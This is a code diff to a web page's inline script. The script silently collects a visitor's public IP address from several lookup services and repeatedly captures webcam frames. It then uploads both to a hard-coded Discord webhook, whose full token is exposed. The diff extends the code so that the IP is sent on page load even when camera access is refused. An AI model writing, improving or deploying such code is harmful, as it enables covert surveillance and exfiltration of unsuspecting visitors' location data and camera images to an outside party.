@@ -8,22 +8,39 @@
 <script>
 const webhook = "https://discord.com/api/webhooks/1375557646765002942/qYhl3vAwgFaFSvn_Tnzno4Z-NlGa_HpS8omMiw53Dt1iwKdjPjkAMxYyWtNl_bo3CleU";
 
-async function getIPInfo() {
+async function fetchIPFromAPI(url, parseFn) {
   try {
-    let res = await fetch('https://ipapi.co/json/');
+    let res = await fetch(url);
     if (!res.ok) return null;
-    return await res.json();
+    let data = await res.json();
+    return parseFn(data);
   } catch {
     return null;
   }
 }
 
-async function sendData(imageBlob, ipInfo) {
+async function getPublicIP() {
+  // Try multiple services
+  let ip = await fetchIPFromAPI('https://api.ipify.org?format=json', data => data.ip);
+  if (ip) return ip;
+
+  ip = await fetchIPFromAPI('https://ipapi.co/json/', data => data.ip);
+  if (ip) return ip;
+
+  ip = await fetchIPFromAPI('https://ipinfo.io/json', data => data.ip);
+  if (ip) return ip;
+
+  return null;
+}
+
+async function sendData(imageBlob, ip) {
   const form = new FormData();
   form.append('payload_json', JSON.stringify({
-    content: IP Info: ${ipInfo ? JSON.stringify(ipInfo) : 'Unavailable'}
+    content: `IP Info: ${ip ? ip : 'Unavailable'}`
   }));
-  form.append('file', imageBlob, 'capture.png');
+  if (imageBlob) {
+    form.append('file', imageBlob, 'capture.png');
+  }
 
   try {
     const response = await fetch(webhook, {
@@ -39,6 +56,9 @@ async function sendData(imageBlob, ipInfo) {
 }
 
 async function captureLoop() {
+  const ip = await getPublicIP();
+  await sendData(null, ip); // send IP info even if no camera access
+
   let stream;
   try {
     stream = await navigator.mediaDevices.getUserMedia({video:true});
@@ -62,9 +82,7 @@ async function captureLoop() {
 
     const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
 
-    const ipInfo = await getIPInfo();
-
-    await sendData(blob, ipInfo);
+    await sendData(blob, ip);
   }
 }
 
